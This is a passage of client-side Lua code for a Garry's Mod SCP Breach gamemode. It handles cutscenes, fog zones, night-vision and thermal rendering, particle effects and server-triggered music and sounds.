local surface = surface
local Material = Material
local draw = draw
local DrawBloom = DrawBloom
local DrawSharpen = DrawSharpen
local DrawToyTown = DrawToyTown
local RunConsoleCommand = RunConsoleCommand;
local tonumber = tonumber;
local tostring = tostring;
local CurTime = CurTime;
local Entity = Entity;
local unpack = unpack;
local table = table;
local pairs = pairs;
local ScrW = ScrW;
local ScrH = ScrH;
local concommand = concommand;
local timer = timer;
local ents = ents;
local hook = hook;
local math = math;
local draw = draw;
local vgui = vgui;
local util = util
local net = net
local player = player



hook.Add("InitPostEntity", "Disable3DSkybox", function()
    timer.Simple(1, function()
        for _, ent in ipairs(ents.FindByClass("sky_camera")) do
            SafeRemoveEntity(ent)
        end
    end)
end)


hook.Add("PlayerStartVoice", "Breach:IntercomVoiceScale", function(ply)
	if ply:GetNWBool("IntercomTalking", false) then
		ply:SetVoiceVolumeScale(GetConVar("breach_config_announcer_volume"):GetInt() / 100 or 1)
	end
end)

function GM:AdjustMouseSensitivity( fDefault )

	local ply = LocalPlayer()
	if ( !( ply && ply:IsValid() ) ) then return -1 end

  local sense = ply:GetNWInt( "Custom_Sensitivity" )

  if ( sense != -1 ) then

    return sense

  end

	local wep = ply:GetActiveWeapon()

	if ( wep && wep.AdjustMouseSensitivity ) then

		return wep:AdjustMouseSensitivity()

	end

	return -1

end

hook.Add("PlayerEndVoice", "Breach:IntercomVoiceScale", function(ply)
	if !IsValid(ply) then
		return
	end

	if ply:GetNWBool("IntercomTalking", false) then
		ply:SetVoiceVolumeScale(1)
	end
end)

function PlaySomeInsaneMusic(музло, громкость)
	if !музло then
		return
	end

	if !громкость then
		громкость = 0.5
	end

	local g_station = nil
	sound.PlayURL(музло, "mono", function(бумбокс)
		if !бумбокс then
			return
		end
		бумбокс:SetPos(LocalPlayer():GetPos())
		бумбокс:SetVolume(громкость)
		бумбокс:Play()
		g_station = бумбокс
	end)
end


net.Receive("BREACH:InsaneMusic", function()
	local песня = net.ReadString()
	local громкость = net.ReadFloat(32)

	PlaySomeInsaneMusic(песня, громкость)
end)

function PlayPoleChudes()
	local g_station = nil
	sound.PlayURL("https://cdn.discordapp.com/attachments/765477415790837761/1009385952952713236/pole_players.mp3", "mono", function(бумбокс)
		if !бумбокс then
			return
		end
		бумбокс:SetPos(LocalPlayer():GetPos())
		бумбокс:SetVolume(0.2)
		бумбокс:Play()
		timer.Simple(16, function()
			бумбокс:Stop()
		end)
		g_station = бумбокс
	end)
end

local ModifiedBones = {}
local function ShrinkBone(bone)
	local client = LocalPlayer()

	for k, v in pairs(client:GetChildBones(bone)) do
		ShrinkBone(v)
	end

	if !ModifiedBones[bone] then
		ModifiedBones[bone] = client:GetManipulateBoneScale(bone)
	end

	client:ManipulateBoneScale(bone, Vector(0, 0, 0))
end

local function RestoreBones()
	for bone, vec in pairs(ModifiedBones) do
		LocalPlayer():ManipulateBoneScale(bone, vec)
		ModifiedBones[bone] = nil
	end
end

hook.Add("ShouldDrawLocalPlayer", "Breach:Gestures:ShouldDrawLocalPlayer", function()
	if LocalPlayer():GetNWBool("Breach:DrawLocalPlayer", false) then
		return true
	else
		if #ModifiedBones > 0 then
			RestoreBones()
		end
	end
end)

local view = {}
hook.Add("CalcView", "Breach:Gestures:CalcView", function(ply, pos, angles, fov)
	if ply:GetNWBool("Breach:DrawLocalPlayer", false) and !IsValid(ply:GetNWEntity("NTF1Entity", NULL)) then
    	local head = ply:LookupBone("ValveBiped.Bip01_Head1") or 6
    	headpos, headang = ply:GetBonePosition(head)
		headpos = headpos or ply:GetShootPos()
		ShrinkBone(head)
    	view.origin = headpos + angles:Up() * 5
    	view.angles = realang
    	view.znear = nearz
    	return view
	end
end)

function PlayAnnouncer(soundname)
	local volume = GetAnnouncerVolume()

	EmitSound(soundname, LocalPlayer():GetPos(), -2, CHAN_STATIC, volume / 100)
end

net.Receive("BreachAnnouncer", function()
	local soundname = net.ReadString()

	PlayAnnouncer(soundname)
end)

function GetClientColor(ply)
	if !IsValid(ply) then
		return Color(255, 255, 255)
	end

	if ply:IsPremium() and ply:GTeam() == TEAM_SPEC then
		local r, g, b = ply:GetNWInt("NameColor_R", 255), ply:GetNWInt("NameColor_G", 255), ply:GetNWInt("NameColor_B", 255)
		local color = Color(r, g, b)

		if color then
			return color
		end
	end

	return Color(255, 255, 255)
end

net.Receive( "CreateParticleAtPos", function()

  local s_effect = net.ReadString()
  local vec = net.ReadVector()
  local parent = net.ReadEntity()

  if ( parent && parent:IsValid() ) then

    local particle_system = CreateParticleSystem( parent, s_effect, PATTACH_ABSORIGIN, 0 )

    if ( !parent:IsPlayer() ) then

      parent.OnRemove = function( self )

        if ( particle_system && particle_system:IsValid() ) then

          particle_system:StopEmissionAndDestroyImmediately()

        end

      end

    else

      timer.Simple( 50, function()

        if ( particle_system && particle_system:IsValid() ) then

          particle_system:StopEmissionAndDestroyImmediately()

        end

      end )

    end

  else

    local particle_system = CreateParticleSystem( game.GetWorld(), s_effect, PATTACH_ABSORIGIN, 0, vec )

    timer.Simple( 50, function()

      if ( particle_system && particle_system:IsValid() ) then

        particle_system:StopEmissionAndDestroyImmediately()

      end

    end )

  end

end )

net.Receive( "CreateClientParticleSystem", function()
	local p_ent = net.ReadEntity()

	if ( !( p_ent && p_ent:IsValid() ) ) then return end

	local s_effect = net.ReadString()
	local n_attachtype = net.ReadUInt( 3 )
	local n_attachmentid = net.ReadUInt( 7 )
	local vec_offset = net.ReadVector() || vector_origin
	local infinite = net.ReadBool() || false
	local life_time = net.ReadUInt( 8 ) || 0

	if ( p_ent.Client_ParticleSystem && p_ent.Client_ParticleSystem:IsValid() ) then
		p_ent.Client_ParticleSystem:StopEmission( false, false, false )
	end

	p_ent.Client_ParticleSystem = CreateParticleSystem( p_ent, s_effect, n_attachtype, n_attachmentid, vec_offset )
		
	if ( !p_ent.Client_ParticleSystem ) then return end

	p_ent.Client_ParticleSystem:StartEmission( infinite )

	if ( life_time > 0 ) then

		timer.Simple( life_time, function()
			if ( p_ent && p_ent:IsValid() && p_ent.Client_ParticleSystem && p_ent.Client_ParticleSystem:IsValid() ) then
				p_ent.Client_ParticleSystem:StopEmission( false, false, false )
			end
		end )
	end

end )

net.Receive("BreachMuzzleflash", function()
local ply = net.ReadEntity()
local vec = net.ReadVector()
local wep = net.ReadEntity()

if ply == LocalPlayer() then return end

	local effectdata = EffectData()
	effectdata:SetOrigin(vec)
	effectdata:SetEntity(wep)
	util.Effect("cw_kk_ins2_muzzleflash", effectdata) 
end)



net.Receive("BreachFlinch", function()

	local ply = LocalPlayer()

	ply.shotdown = true
	ply.shot_EffectTime = CurTime() + 0.4

	if ply:GTeam() != TEAM_SCP then
		ply.DamageMovePenalty = 50
	end

end)

function FPCutScene()

	local client = LocalPlayer()

	if CLIENT then

		if client then
			
			local function FirstPersonScene(ply, pos, angles, fov)
				if ply then
					local view = {}
					local head = ply:GetAttachment( ply:LookupAttachment( "eyes" ) )
					if head then
						view.origin = head.Pos
						view.angles = head.Ang
					end
					view.fov = fov
					view.drawviewer = true
					return view
				end
			end
			hook.Add( "CalcView", "FirstPersonScene"..client:SteamID(), FirstPersonScene )

		end

	end

end
net.Receive("FirstPerson", FPCutScene)

local shrunkbones = {}

function FPCutScene_NPC()

	local npc = net.ReadEntity()

	local client = LocalPlayer()

	if CLIENT then

		if client then
			
			local function FirstPersonScene_NPC(ply, pos, angles, fov)
				if ply then
					local view = {}
					local head = npc:GetAttachment( npc:LookupAttachment( "eyes" ) )
					if head then
						view.origin = head.Pos
						view.angles = head.Ang
					end
					view.fov = fov
					view.drawviewer = true
					return view
				end
			end
			hook.Add( "CalcView", "FirstPersonScene_NPC"..client:SteamID(), FirstPersonScene_NPC )

		end

	end

end
net.Receive("FirstPerson_NPC", FPCutScene_NPC)

function shrinkbones(bone)
	for k, v in pairs(LocalPlayer():GetChildBones(bone)) do
		shrinkbones(v) 
	end
	if not shrunkbones[bone] then
		shrunkbones[bone] = LocalPlayer():GetManipulateBoneScale(bone)
	end
	LocalPlayer():ManipulateBoneScale(bone, Vector(0, 0, 0))
end

function GM:SetupWorldFog()
    local pos = LocalPlayer():GetPos()

	if GetGlobalBool("FurryRound") then
		if pos.z < 1700 then
			render.FogMode(1)
    	    render.FogStart(0)
    	    render.FogEnd(1)
    	    render.FogColor(27, 1, 1)
    	    render.FogMaxDensity(0.85)

    	    return true
		end
	end

	if pos:WithinAABox( Vector(-984.122070, -3499.068115, -1405), Vector(2166.351318, -6167.319824, -782) ) then
		render.FogMode(1)
        render.FogStart(0)
        render.FogEnd(150)
        render.FogColor(77, 49, 49)
        render.FogMaxDensity(0.99)

        return true
	end

	if pos:WithinAABox( Vector(1532.615479, -12199.956055, -5367), Vector(4299.934082, -15572.434570, -6826) ) then
		render.FogMode(1)
        render.FogStart(0)
        render.FogEnd(150)
        render.FogColor(0, 0, 0)
        render.FogMaxDensity(0.99)

        return true
	end

	if pos:WithinAABox( Vector(8296.992188, -11147.999023, -7075), Vector(4355.788574, -15708.113281, -4982) ) then
		render.FogMode(1)
        render.FogStart(0)
        render.FogEnd(150)
        render.FogColor(44, 62, 55)
        render.FogMaxDensity(0.99)

        return true
	end

	if pos:WithinAABox( Vector(14931.283203, -10476.387695, -6617), Vector(9126.845703, -15756.692383, -4692) ) then
		render.FogMode(1)
        render.FogStart(0)
        render.FogEnd(500)
        render.FogColor(43, 115, 124)
        render.FogMaxDensity(1)

        return true
	end
	if pos:WithinAABox( Vector(1490.733032, -11294.509766, -3757), Vector(-4388.770996, -15878.234375, 38) ) then
    	render.SetFogZ( 45 )
    	render.FogMode( 1 )
    	render.FogStart( 0 )
    	render.FogEnd( 256 )
    	render.FogMaxDensity( .999 )
    	render.FogColor( 25, 25, 25 )
		return true
	end
end

function GM:SetupSkyFog( skyboxscale )

end

CreateMaterial( "apc_interior_nocolor", "VertexLitGeneric", {
  ["$basetexture"] = "models/chaos_jeep/interior_light_and_colour",
  ["$model"] = 1,
  ["$translucent"] = 1,
  ["$vertexalpha"] = 1,
  ["$vertexcolor"] = 1
} )

local apclights = {
	Vector(15206.360351563, 12782.16796875, -15619.75390625),
	Vector(15200.668945313, 12871.985351563, -15620.077148438),
	Vector(15287.80859375, 12870.5234375, -15622.7421875),
	Vector(15284.715820313, 12776.360351563, -15621.188476563),
	Vector(15186.146484375, 12822.694335938, -15619.131835938),
}


function APC_spawn_CI_Cutscene()

	local apc = ClientsideModel("models/scp_chaos_jeep/chaos_jeep.mdl")
	apc:Spawn()
	apc:SetPos(Vector(15200.626953125, 12824.885742188, -15706.223632813))
	apc:SetAngles(Angle(0.000, -180.000, 0.000))

	apc:SetSubMaterial(5, "!apc_interior_nocolor")

	sound.PlayFile( "sound/rxsend/sup_spawn/snow_ambient.mp3", "3d", function( station, errCode, errStr )
		if ( IsValid( station ) ) then
			station:SetPos(apc:GetPos())
			station:SetVolume(0.1)
			station:Play()
		end
	end )

	hook.Add("Think", "APC_spawn_CI_Cutscene", function()
		for i = 1, #apclights do
			local dlight = DynamicLight( LocalPlayer():EntIndex()+i )
			if ( dlight ) then
				dlight.pos = apclights[i]
				dlight.r = 35
				dlight.g = 50
				dlight.b = 35
				dlight.brightness = 2
				dlight.decay = 1000
				dlight.size = 256
				dlight.dietime = CurTime() + 1
			end
		end
	end)

	timer.Simple(32, function() apc:Remove() hook.Remove("Think", "APC_spawn_CI_Cutscene") end)

end

function FPCutScene_NPC_Action()

	local npc = net.ReadEntity()

	local client = LocalPlayer()

	if CLIENT then

		if client then
			
			local function FirstPersonScene_NPC_Action(ply, pos, angles, fov)
				if ply then
					local view = {}
					local head = npc:GetAttachment( npc:LookupAttachment( "eyes" ) )
					if head then

						view.origin = head.Pos + Vector(-1, -2, 0)
						view.angles = ply:EyeAngles()

						shrinkbones(ply:LookupBone("ValveBiped.Bip01_Head1") or 6)

						
					end
					view.fov = fov
					view.drawviewer = true
					return view
				end
			end
			hook.Add( "CalcView", "FirstPersonScene_NPC_Action"..client:SteamID(), FirstPersonScene_NPC_Action )

		end

	end

end
net.Receive("FirstPerson_NPC_Action", FPCutScene_NPC_Action)

function restorebones()
	for bone, vec in pairs(shrunkbones) do
		LocalPlayer():ManipulateBoneScale(bone, vec)
		shrunkbones[bone] = nil
	end
end

function FPRemove()

	local client = LocalPlayer()

	if CLIENT then

		if client then
			
			hook.Remove("CalcView", "FirstPersonScene"..client:SteamID())
			hook.Remove("CalcView", "FirstPersonScene_NPC"..client:SteamID())
			hook.Remove("CalcView", "FirstPersonScene_NPC_Action"..client:SteamID())


			restorebones()

		end

	end
end
net.Receive("FirstPerson_Remove", FPRemove)

local playerMeta = FindMetaTable( "Player" )

local light_pos = Vector(-4704.143555, -9276.894531, 6221)
net.Receive( "StartCIScene", function()

	local caller = LocalPlayer()

	local dlight = DynamicLight( caller:EntIndex() )

	if ( dlight ) then

		dlight.pos = light_pos
		dlight.r = 255
		dlight.g = 255
		dlight.b = 255
		dlight.brightness = 2
		dlight.Decay = 1000
		dlight.Size = 980
		dlight.DieTime = CurTime() + 10

	end

	StartSceneClientSide( caller )

end )

net.Receive("BreachNotifyFromServer", function()
    local message = net.ReadString()
    message = tostring(message)

    if message == nil then return end
    
    if isstring(message) then
        chat.AddText(Color(0, 255, 0), "[ZCity Breach] ", Color(255, 255, 255), message)
    end
    
end)

function ClientBoneMerge( ent, model, submat )

    local bonemerge_ent = ents.CreateClientside( "ent_bonemerged" )

    

    bonemerge_ent:SetModel( model )

    bonemerge_ent:SetSkin( ent:GetSkin() || 0 )

    bonemerge_ent:Spawn()

    bonemerge_ent:SetParent( ent, 0 )

    bonemerge_ent:SetLocalPos( vector_origin )

    bonemerge_ent:SetLocalAngles( angle_zero )

    bonemerge_ent:AddEffects( bit.bor(EF_BONEMERGE, EF_BONEMERGE_FASTCULL) )
	bonemerge_ent:SetSubMaterial( 0, submat )

    if ( !ent.BoneMergedEnts ) then

        ent.BoneMergedEnts = {}

    end

    ent.BoneMergedEnts[ #ent.BoneMergedEnts + 1 ] = bonemerge_ent
	
	return bonemerge_ent
end

function HedwigAbility()
	local client = LocalPlayer()
	if !client:HaveSpecialAb(role.SCI_SPECIAL_VISION) then return end
	hook.Remove( "PostDrawTranslucentRenderables", "Hedwig_Ability" )

    clr_red = .08
    clr_green = .08
    clr_blue = .08

    local hedwigdietime = CurTime() + 20

    hook.Add( "PostDrawTranslucentRenderables", "Hedwig_Ability", function()

      local client = LocalPlayer()

      local playerpos = client:GetPos()
      local eyespos = client:EyePos() + client:EyeAngles():Forward() * 8
      local eyeang = client:EyeAngles()
      eyeang = Angle( eyeang.p + 90, eyeang.y, 0 )
      if hedwigdietime < CurTime() then hook.Remove( "PostDrawTranslucentRenderables", "Hedwig_Ability" ) end
      render.ClearStencil()

      render.SetStencilEnable( true )

        render.SetStencilWriteMask( 255 )
        render.SetStencilTestMask( 255 )
        render.SetStencilReferenceValue( 1 )

        for _, ent in ipairs( player.GetAll() ) do

          if ( ent:IsPlayer() || ent:IsNPC() ) then

            if ( ent == client ) then

              if ( ent:Health() <= 0 || !ent:HaveSpecialAb(role.SCI_SPECIAL_VISION) ) then

                hook.Remove( "PostDrawTranslucentRenderables", "Hedwig_Ability" )

                return
              end

            else

              local current_team = ent:IsPlayer() && ent:GTeam()

              if ( ent:IsPlayer() && current_team == TEAM_SPEC ) then continue end

              if ( current_team == TEAM_SCP && !ent:IsSolid() ) then continue end
              if current_team != TEAM_SCP then continue end
              if ent:IsPlayer() and ent:Health() <= 0 then continue end
              if ent:IsPlayer() and !ent:Alive() then continue end

              render.SetStencilCompareFunction( STENCIL_ALWAYS )
              render.SetStencilZFailOperation( STENCIL_REPLACE )

              render.SetStencilPassOperation( STENCIL_REPLACE )
              render.SetStencilFailOperation( STENCIL_KEEP )
              ent:DrawModel()

              local tbl_bonemerged = ents.FindByClassAndParent( "ent_bonemerged", ent )

              if ( tbl_bonemerged && istable( tbl_bonemerged ) ) then

                for _, v in ipairs( tbl_bonemerged ) do

                  if ( v && v:IsValid() ) then

                    v:DrawModel()

                  end

                end

              end

              render.SetStencilCompareFunction( STENCIL_EQUAL )
              render.SetStencilZFailOperation( STENCIL_KEEP )
              render.SetStencilPassOperation( STENCIL_KEEP )
              render.SetStencilFailOperation( STENCIL_KEEP )

              cam.Start3D2D( eyespos, eyeang, 1 )
              
                surface.SetDrawColor( 255, 0, 0, 80 )
                surface.DrawRect( -ScrW(), -ScrH(), ScrW() * 2, ScrH() * 2 )

              cam.End3D2D()

            end

          end

        end

        render.SetStencilCompareFunction( STENCIL_NOTEQUAL )
        render.SetStencilZFailOperation( STENCIL_KEEP )
        render.SetStencilPassOperation( STENCIL_KEEP )
        render.SetStencilFailOperation( STENCIL_KEEP )

      render.SetStencilEnable( false )
    end)
end

function StartSceneClientSide( ply )

	local character = ents.CreateClientside( "base_gmodentity" )
	character:SetPos( Vector(-4704.3266601563, -9493.59765625, 6145.03125) )
	character:SetAngles( Angle( 0, 90, 0 ) )
	character:SetModel( LocalPlayer():GetModel() )
	character:Spawn()
	character:SetSequence( "photo_react_blind" )
	character:SetCycle( 0 )
	character:SetPlaybackRate( 1 )
	for _, bnm in pairs(LocalPlayer():LookupBonemerges()) do
		if IsValid(bnm) then
			ClientBoneMerge(character,bnm:GetModel())
		end
	end
	character.AutomaticFrameAdvance = true
	local cycle = 0
	character.Think = function( self )

		self:NextThink( CurTime() )
		self:SetCycle( math.Approach( cycle, 1, FrameTime() * 0.2 ) )
		cycle = self:GetCycle()
		return true

	end

	ply.InCutscene = true

	

	local CI = ents.CreateClientside("base_gmodentity")
	CI:SetPos(Vector(-4751.6357421875, -9288.740234375, 6145.03125))
	CI:SetAngles(Angle(0, -90, 0))
	CI:SetModel("models/cultist/humans/chaos/chaos.mdl")
	CI:SetMoveType(MOVETYPE_NONE)
    CI:SetBodygroup( 0, 0 )
    CI:SetBodygroup( 1, 1 )
	CI:Spawn()
	CI:SetColor( color_black )
	CI:SetSequence("LineIdle02")
	CI:SetPlaybackRate(1)
	CI.OnRemove = function( self )

		if ( self.BoneMergedEnts ) then

			for _, v in ipairs( self.BoneMergedEnts ) do

				if ( v && v:IsValid() ) then

					v:Remove()

				end

			end

		end

	end

	ClientBoneMerge( CI, "models/cultist/humans/chaos/head_gear/beret.mdl" )
	

	local handsid = CI:LookupAttachment('anim_attachment_RH')
	local hands = CI:GetAttachment( handsid )

	timer.Simple( 2, function()

		CI:EmitSound( "nextoren/vo/chaos/class_d_alternate_ending.ogg" )

	end )
	CI.AutomaticFrameAdvance = true


	CI.Think = function( self )

		self.NextThink = ( CurTime() )
		if ( self:GetCycle() >= 0.01 ) then self:SetCycle( 0.01 ) end

	end

	local cycle3 = 0
	local CI2 = ents.CreateClientside("base_gmodentity")
	CI2:SetPos(Vector(-4700.43359375, -9340.9365234375, 6145.03125))
	CI2:SetAngles(Angle(0, -94, 0))
	CI2:SetModel("models/cultist/humans/chaos/chaos.mdl")
	CI2:SetMoveType(MOVETYPE_NONE)
	CI2:Spawn()
	CI2:SetColor( color_black )
	CI2:SetBodygroup( 0, 1 )
    CI2:SetBodygroup( 1, 0 )
    CI2:SetBodygroup( 2, 1 )
    CI2:SetBodygroup( 4, 0 )
	CI2:SetBodygroup( 5, 0 )
	CI2:SetSequence( "AHL_menuidle_SHOTGUN" )
	CI2:SetPlaybackRate( 1 )
	
	ClientBoneMerge( CI2, "models/cultist/humans/chaos/head_gear/helmet.mdl" )
	local handsid2 = CI2:LookupAttachment('anim_attachment_RH')
	local hands2 = CI2:GetAttachment( handsid )
	CI2.AutomaticFrameAdvance = true
	CI2.OnRemove = function( self )

		if ( self.BoneMergedEnts ) then

			for _, v in ipairs( self.BoneMergedEnts ) do

				if ( v && v:IsValid() ) then

					v:Remove()

				end

			end

		end

	end


	
	
	
	
	
	

    CI2.Think = function(self)
		if !CI2:IsValid() then return end
		self:NextThink( CurTime() )

		local handsid7 = CI2:LookupAttachment('anim_attachment_RH')
		local hands7 = CI2:GetAttachment( handsid )
        
		self:SetCycle( math.Approach( cycle3, 1, FrameTime() * 0.15 ) )
		cycle3 = self:GetCycle()


		



	end
	local cycle2 = 0
	local CI3 = ents.CreateClientside("base_gmodentity")
	CI3:SetPos(Vector(-4659.1362304688, -9279.998046875, 6145.03125))
	CI3:SetAngles(Angle(0, -70, 0))
	CI3:SetModel("models/cultist/humans/chaos/chaos.mdl")
	CI3:SetMoveType(MOVETYPE_NONE)
	CI3:Spawn()
	CI3:SetBodygroup( 0, 1 )
    CI3:SetBodygroup( 1, 0 )
    CI3:SetBodygroup( 2, 1 )
    CI3:SetBodygroup( 4, 0 )
	CI3:SetBodygroup( 5, 0 )
	CI3:SetColor( color_black )
	CI3:SetSequence("MPF_adooridle")
	CI3:SetPlaybackRate(1)
	local handsid3 = CI3:LookupAttachment('anim_attachment_RH')
	local hands3 = CI3:GetAttachment( handsid )
	
	ClientBoneMerge( CI3, "models/cultist/humans/chaos/head_gear/helmet.mdl" )

	CI3.AutomaticFrameAdvance = true
	CI3.OnRemove = function( self )

		if ( self.BoneMergedEnts && istable( self.BoneMergedEnts ) ) then

			for _, v in ipairs( self.BoneMergedEnts ) do

				if ( v && v:IsValid() ) then

					v:Remove()

				end

			end

		end

	end

	CI3.Think = function(self)

		self:NextThink( CurTime() )
		self:SetCycle( math.Approach( cycle2, 1, FrameTime() * 0.2 ) )
		cycle2 = self:GetCycle()


	end
	
	
	
	
	
	


    timer.Simple( 8, function()

        
        
        CI:Remove()
        CI2:Remove()
        CI3:Remove()
		ply.InCutscene = false
		character:Remove()
		ply:SetNWEntity("NTF1Entity", NULL)

    end )

end
concommand.Add("CI_Anim_Escsp", StartSceneClientSide)

local EntMats = {}
local mat_white = Material("models/debug/debugwhite")
local mat_colornvg = Material("pp/colour")

net.Receive( "NightvisionOn", function()

  local stype = net.ReadString()

  local color_mod = {
      ["$pp_colour_addr"] = 0,
      ["$pp_colour_addg"] = 0,
      ["$pp_colour_addb"] = 0,
      ["$pp_colour_brightness"] = 0.01,
      ["$pp_colour_contrast"] = 3.5,
      ["$pp_colour_colour"] = 1,
      ["$pp_colour_mulr"] = 0,
      ["$pp_colour_mulg"] = 0,
      ["$pp_colour_mulb"] = 0
  }
  
  local draw_silhouette = false -- Будет ли рисоваться силуэт?
  local thermal_dist_sqr = 1024 * 1024
  local thermal_through_walls = false
  local thermal_color = Color(255, 255, 255, 80)

  local client = LocalPlayer()
  client.NVG = true
  NIGHTVISION_ON = true

  hook.Remove( "PostDrawTranslucentRenderables", "ThermalVisionRed" )
  hook.Remove( "PostDrawTranslucentRenderables", "ThermalVisionWhite" )
  hook.Remove( "PostDrawTranslucentRenderables", "ThermalVisionStandard" )
  hook.Remove( "RenderScreenspaceEffects", "ThermalVisionRed_Pixelate" )
  hook.Remove( "PostDrawTranslucentRenderables", "NightVision_Chams" )
  hook.Remove( "RenderScreenspaceEffects", "NVGOverlayplusligthing" )

  if stype == "green" then
      color_mod["$pp_colour_addg"] = 0.01
      draw_silhouette = false

  elseif stype == "blue" then
      color_mod["$pp_colour_addb"] = 0.04
      draw_silhouette = false

  elseif stype == "white" then
      color_mod["$pp_colour_addr"] = 0.02
      color_mod["$pp_colour_addg"] = 0.02
      color_mod["$pp_colour_addb"] = 0.02
      
      draw_silhouette = true
      thermal_dist_sqr = 1200 * 1200
      thermal_color = Color(255, 255, 255, 80)

  elseif stype == "red" then
      color_mod["$pp_colour_addr"] = 0.05
      color_mod["$pp_colour_brightness"] = -0.06
      color_mod["$pp_colour_contrast"] = 1.3
      color_mod["$pp_colour_colour"] = 0.1
      
      draw_silhouette = true
      thermal_dist_sqr = 3000 * 3000
      thermal_through_walls = true
      thermal_color = Color(255, 80, 0, 180)
  end

  hook.Add("RenderScreenspaceEffects", "NVGOverlayplusligthing", function()
      local ply = LocalPlayer()

      if not ply.NVG or ply:Health() <= 0 or not (ply:IIHasWeapon("item_nightvision_white") or ply:IIHasWeapon("item_nightvision_blue") or ply:IIHasWeapon("item_nightvision_green") or ply:IIHasWeapon("item_nightvision_red")) then
          ply.CustomRenderHook = nil
          NIGHTVISION_ON = false
          hook.Remove("RenderScreenspaceEffects", "NVGOverlayplusligthing")
          return
      end

      DrawColorModify(color_mod)

      if draw_silhouette then
          render.ClearStencil()
          render.SetStencilEnable(true)
          render.SetStencilWriteMask(255)
          render.SetStencilTestMask(255)
          render.SetStencilReferenceValue(1)

          render.SetStencilCompareFunction(STENCIL_ALWAYS)
          render.SetStencilPassOperation(STENCIL_REPLACE)
          render.SetStencilFailOperation(STENCIL_KEEP)
          
          render.SetStencilZFailOperation(thermal_through_walls and STENCIL_REPLACE or STENCIL_KEEP)

          cam.Start3D(EyePos(), EyeAngles())
              if thermal_through_walls then cam.IgnoreZ(true) end
              
              for _, ent in player.Iterator() do
                  if ent ~= ply and ent:Alive() and ent:GTeam() ~= TEAM_SPEC and ent:GTeam() ~= TEAM_GOC then
                      if ent:IsDormant() or ent:GetNoDraw() then continue end
                      if ent:GetPos():DistToSqr(ply:GetPos()) > thermal_dist_sqr then continue end
                      if not thermal_through_walls then
                          local tr = util.TraceLine({
                              start = EyePos(),
                              endpos = ent:WorldSpaceCenter(),
                              filter = {ply, ent},
                              mask = MASK_OPAQUE
                          })
                          if tr.Hit then continue end
                      end

                      local mins, maxs = ent:GetRenderBounds()
                      ent:SetRenderBounds(Vector(-10000, -10000, -10000), Vector(10000, 10000, 10000))
                      
                      ent:DrawModel()
                      
                      ent:SetRenderBounds(mins, maxs)

                      if ent.LookupBonemerges then
                          for _, bnm in pairs(ent:LookupBonemerges()) do
                              if IsValid(bnm) and not bnm:GetNoDraw() then
                                  local bmins, bmaxs = bnm:GetRenderBounds()
                                  bnm:SetRenderBounds(Vector(-10000, -10000, -10000), Vector(10000, 10000, 10000))
                                  bnm:DrawModel()
                                  bnm:SetRenderBounds(bmins, bmaxs)
                              end
                          end
                      end
                  end
              end
              
              if thermal_through_walls then cam.IgnoreZ(false) end
          cam.End3D()

          render.SetStencilCompareFunction(STENCIL_EQUAL)
          render.SetStencilZFailOperation(STENCIL_KEEP)
          render.SetStencilPassOperation(STENCIL_KEEP)

          cam.Start2D()
              surface.SetDrawColor(thermal_color)
              surface.DrawRect(0, 0, ScrW(), ScrH())
          cam.End2D()

          render.SetStencilEnable(false)
      end
  end)

end )



net.Receive( "ArmorIndicator", function()

  local stype = net.ReadString()
  local bHas = net.ReadBool()
  local ArmorEntity = net.ReadString()

  local plent = LocalPlayer()

  if ( stype == "Everything" ) then

    plent.HasHelmet = bHas
    plent.HasArmor = bHas
    plent.UsingCloth = bHas
    plent.Hat = bHas
    plent.ArmorEnt = bHas
    plent.HasBag = bHas
    plent.BagEnt = bHas
    plent.DisableFootsteps = nil

    return
  end

  if ( stype == "Hat" ) then

    plent.HasHelmet = bHas
    plent.Hat = ArmorEntity

  elseif ( stype == "Armor" ) then

    plent.HasArmor = bHas
    plent.ArmorEnt = ArmorEntity

  elseif ( stype == "Clothes" ) then

    plent.UsingCloth = ArmorEntity

  elseif ( stype == "Bag" ) then

    plent.HasBag = bHas
    plent.BagEnt = ArmorEntity

  end

end )

local view_punch_angle = Angle( -30, 0, 0 )
local dust_vector = Vector( 8335.725586, 9467.191406, -15023 )
local particle_origin = Vector( -525.942322, -6318.510742, -2352.465820 )

net.Receive( "ChangeRunAnimation", function()

  local ent = net.ReadEntity()
  local animation = net.ReadString()
  animation = ent:LookupSequence( animation )

  if ( !isnumber( animation ) ) then return end

  ent.SafeRun = animation

end )

net.Receive("Boom_Effectus", function()

	local player = LocalPlayer()

    util.ScreenShake( vector_origin, 200, 10, 20, 32768 );

    ParticleEffect( "vman_nuke", dust_vector, angle_zero );
    ParticleEffect( "vman_nuke", particle_origin, angle_zero );

    timer.Simple(7, function()

    	if player:GTeam() != TEAM_SPEC and player:Health() > 0 then
          player:ViewPunch( view_punch_angle )
        end

    end)

    timer.Simple(5, function()

      ParticleEffect( "dustwave_tracer", dust_vector, angle_zero );

    end)

    timer.Simple(5, function()

	    util.ScreenShake( vector_origin, 200, 100, 10, 32768);

	    player:ScreenFade( SCREENFADE.OUT, color_black, 2.3, 10 )

	    timer.Simple(4, function()
	    	player.no_signal = true
	    end)

    end)

end)

net.Receive("Fake_Boom_Effectus", function()

	local player = LocalPlayer()

    util.ScreenShake( vector_origin, 200, 10, 20, 32768 );

    ParticleEffect( "vman_nuke", dust_vector, angle_zero );
    ParticleEffect( "vman_nuke", particle_origin, angle_zero );

    timer.Simple(7, function()

    	if player:GTeam() != TEAM_SPEC and player:Health() > 0 then
          player:ViewPunch( view_punch_angle )
        end

    end)

    timer.Simple(5, function()

      ParticleEffect( "dustwave_tracer", dust_vector, angle_zero );

    end)

    timer.Simple(5, function()

	    util.ScreenShake( vector_origin, 200, 100, 10, 32768);

		timer.Simple(4, function()
	    	RunConsoleCommand("stopsound")
	    end)
    end)

end)

net.Receive( "NightvisionOff", function()

  LocalPlayer().NVG = false

end )

net.Receive( "GestureClientNetworking", function()

  local gesture_ent = net.ReadEntity()

  if ( !( gesture_ent && gesture_ent:IsValid() ) ) then return end

  local gesture = net.ReadString()
  local gesture_id = gesture_ent:LookupSequence(gesture)
  local gesture_slot = net.ReadUInt( 3 )
  local loop = net.ReadBool()
  local cycle = net.ReadFloat()

  if gesture:StartWith("hg_") then
  	gesture_ent.talkedrecently = CurTime() + gesture_ent:SequenceDuration(gesture_id)
  end

  gesture_ent:AnimResetGestureSlot( gesture_slot )
  gesture_ent:AddVCDSequenceToGestureSlot( gesture_slot, gesture_id, cycle, loop )

end )

net.Receive( "StopGestureClientNetworking", function()

	local gesture_ent = net.ReadEntity()

  if ( !( gesture_ent && gesture_ent:IsValid() ) ) then return end

